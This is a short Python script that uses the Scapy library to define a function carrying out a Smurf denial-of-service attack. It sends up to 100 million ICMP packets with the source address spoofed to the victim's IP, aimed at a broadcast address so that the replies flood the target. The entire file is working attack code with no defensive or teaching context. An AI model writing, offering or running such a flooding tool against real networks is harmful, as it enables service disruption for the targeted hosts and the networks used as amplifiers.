from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import send


def smurf(attack_target_ip: str, broadcast_ip: str):
    # icmp_packet = ICMP(type=8, code=0, id=12345, seq=12)
    # ip_packet = IP(src=attack_target_ip, dst=broadcast_ip) / icmp_packet
    seq = 123
    print(f"Smurf attack to {attack_target_ip} via {broadcast_ip}")

    for i in range(100000000):
        try:
            icmp_packet = ICMP(type=0, code=0, id=12345, seq=seq)
            seq += 1
            ip_packet = IP(src=attack_target_ip, dst=broadcast_ip, ttl=65) / icmp_packet
            send(ip_packet, verbose=0)
            print(f'Packet {i + 1} send to {broadcast_ip}')
            # time.sleep(1)
        except Exception as e:
            print(f"Error while sending: {e}")
            break

    print("End of attack.")